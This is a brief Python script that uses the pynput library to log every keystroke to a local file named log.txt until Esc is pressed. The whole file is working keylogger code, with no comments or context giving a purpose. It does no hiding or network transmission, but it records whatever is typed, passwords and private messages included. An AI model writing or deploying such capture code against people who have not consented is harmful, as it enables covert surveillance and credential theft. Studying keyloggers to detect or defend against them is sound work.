from pynput.keyboard import Listener, Key

def on_press(key):
    key_str = str(key).replace("'", "")
    with open("log.txt", "a") as log_file:
        log_file.write(key_str + "\n")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
